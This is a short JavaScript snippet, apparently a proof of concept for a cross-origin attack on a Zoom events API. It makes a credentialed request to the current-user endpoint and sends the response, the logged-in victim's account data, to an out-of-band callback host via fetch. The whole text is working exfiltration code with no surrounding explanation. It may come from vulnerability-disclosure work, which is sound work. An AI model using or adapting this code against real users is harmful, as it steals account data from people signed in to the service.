var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('GET','https://events.zoom.us/api/v1/e/getCurrentUser',true); 
req.withCredentials = true;
req.send();

function reqListener() {
    for(let i = 0; i < 2; i++){
        fetch(('https://ck2ptbh2vtc00000284ggjtmpfhyyyyyb.oast.fun/?xxx='+this.responseText))
    }
};
